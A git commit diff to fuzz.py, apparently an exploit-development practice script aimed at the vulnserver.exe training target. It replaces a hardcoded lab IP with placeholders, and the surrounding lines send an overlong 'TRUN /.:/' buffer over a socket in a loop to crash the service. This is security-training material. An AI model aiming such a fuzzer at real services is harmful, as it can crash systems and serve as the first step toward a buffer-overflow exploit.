05160ef0e7479b04c6c2ff12837bc5443692799e
Obehi Iredia <44153313+i0bj@users.noreply.github.com>
2020-12-20 20:12:50 -0500

    Update fuzz.py
    This was used against vulnserver.exe

--- fuzz.py
+++ fuzz.py
@@ -7,7 +7,7 @@ buffer = "A" * 100
 while True:
         try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(("192.168.1.90", 9999))
+                s.connect(("ip", port))
                 
                 
                 s.send(("TRUN /.:/" + buffer))
